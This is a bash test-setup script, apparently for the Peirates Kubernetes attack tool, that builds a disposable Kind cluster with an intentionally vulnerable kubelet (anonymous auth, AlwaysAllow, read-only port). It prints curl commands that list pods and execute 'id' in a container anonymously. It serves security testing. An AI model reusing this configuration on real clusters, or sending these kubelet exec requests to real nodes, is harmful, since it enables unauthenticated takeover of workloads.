#!/usr/bin/env bash
set -euo pipefail

# SECURITY: This creates an intentionally vulnerable kubelet for local testing.
# It must only be used as a disposable Kind cluster on an isolated workstation.
cluster_name="${PEIRATES_KUBELET_MANUAL_CLUSTER:-peirates-kubelet-manual}"
context="kind-${cluster_name}"
namespace="peirates-kubelet-manual"
node_lister_role="peirates-kubelet-manual-node-lister"
node_lister_binding="peirates-kubelet-manual-node-lister"
pod_name="kubelet-manual-target"
config_file="$(mktemp /tmp/peirates-kubelet-manual.XXXXXX.yaml)"
setup_complete=false

cleanup() {
    rm -f "${config_file}"
    if [[ "${setup_complete}" != true ]]; then
        echo "setup did not complete; deleting partial cluster ${cluster_name}" >&2
        kind delete cluster --name "${cluster_name}" >/dev/null 2>&1 || true
    fi
}
trap cleanup EXIT INT TERM

for required in kind kubectl docker; do
    command -v "${required}" >/dev/null || {
        echo "missing required command: ${required}" >&2
        exit 1
    }
done

if kind get clusters 2>/dev/null | grep -Fxq "${cluster_name}"; then
    echo "refusing to modify existing Kind cluster ${cluster_name}" >&2
    echo "choose another name with PEIRATES_KUBELET_MANUAL_CLUSTER" >&2
    exit 1
fi

cat >"${config_file}" <<'CONFIG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
  kubeadmConfigPatches:
  - |
    kind: InitConfiguration
    nodeRegistration:
      kubeletExtraArgs:
        anonymous-auth: "true"
        authorization-mode: "AlwaysAllow"
        read-only-port: "10255"
CONFIG

kind create cluster --name "${cluster_name}" --config "${config_file}" --wait 120s
kubectl --context "${context}" create namespace "${namespace}"
kubectl --context "${context}" create clusterrole "${node_lister_role}" \
    --verb=get,list --resource=nodes
kubectl --context "${context}" create clusterrolebinding "${node_lister_binding}" \
    --clusterrole="${node_lister_role}" --serviceaccount="${namespace}:default"
for verb in get list; do
    if [[ "$(kubectl --context "${context}" auth can-i "${verb}" nodes \
        --as="system:serviceaccount:${namespace}:default")" != "yes" ]]; then
        echo "default service account was not authorized to ${verb} nodes" >&2
        exit 1
    fi
done

kubectl --context "${context}" -n "${namespace}" run "${pod_name}" \
    --image=busybox:1.36.1 --restart=Never --command -- sh -c 'sleep 3600'
kubectl --context "${context}" -n "${namespace}" wait \
    --for=condition=Ready "pod/${pod_name}" --timeout=120s

container_name="$(kubectl --context "${context}" -n "${namespace}" get pod "${pod_name}" -o jsonpath='{.spec.containers[0].name}')"
node_ip="$(kubectl --context "${context}" get node "${cluster_name}-control-plane" -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')"
if [[ -z "${container_name}" || -z "${node_ip}" ]]; then
    echo "could not determine target container name or node IP" >&2
    exit 1
fi

setup_complete=true

cat <<INFO

The intentionally vulnerable manual test cluster is ready and will remain running.

Cluster:   ${cluster_name}
Context:   ${context}
Node IP:   ${node_ip}
Target:    ${namespace}/${pod_name}/${container_name}
RBAC:      system:serviceaccount:${namespace}:default may get and list nodes

List pods anonymously through the read-only kubelet port:
  curl -fsS http://${node_ip}:10255/pods

Execute id anonymously through the HTTPS kubelet port:
  curl -ksS -X POST 'https://${node_ip}:10250/run/${namespace}/${pod_name}/${container_name}/?cmd=id'

Inspect the target through Kubernetes:
  kubectl --context ${context} -n ${namespace} exec ${pod_name} -c ${container_name} -- id

Delete the cluster when finished:
  kind delete cluster --name ${cluster_name}

WARNING: anonymous authentication, AlwaysAllow authorization, and the read-only
kubelet port are intentionally enabled. Do not expose or reuse this cluster.
INFO
